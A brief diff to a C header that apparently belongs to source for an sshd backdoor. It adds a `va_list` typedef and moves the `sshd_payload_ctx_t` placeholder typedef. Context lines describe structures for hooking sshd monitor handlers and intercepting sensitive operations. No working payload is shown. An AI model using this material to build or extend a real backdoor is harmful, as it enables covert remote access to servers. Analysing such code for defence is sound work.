@@ -10,6 +10,8 @@ typedef unsigned long uintptr_t;
 
 typedef long intptr_t;
 
+typedef void *va_list;
+
 typedef signed char int8_t;
 
 typedef unsigned char uint8_t;
@@ -848,6 +850,11 @@ typedef struct sshbuf sshbuf;
 typedef int (*sshd_monitor_func_t)(struct ssh *ssh, int sock, struct sshbuf *m);
 
 /*
+ * Reserved pointer that will eventually hold sshd-specific payload book-keeping; today it is only used as a typed placeholder hanging off `global_context_t`.
+ */
+typedef u8 sshd_payload_ctx_t;
+
+/*
  * Snapshot of the sshd monitor state that tracks where each `mm_answer_*` handler lives, whether it has already been hooked, and which request IDs correspond to the sensitive operations we intercept.
  */
 typedef struct __attribute__((packed)) sshd_ctx {
@@ -974,11 +981,6 @@ typedef struct __attribute__((packed)) sshd_offsets {
   u32 raw_value;
  };
 } sshd_offsets_t;
-
-/*
- * Reserved pointer that will eventually hold sshd-specific payload book-keeping; today it is only used as a typed placeholder hanging off `global_context_t`.
- */
-typedef u8 sshd_payload_ctx_t;
 
 /*
  * Authoritative runtime state for the backdoor.
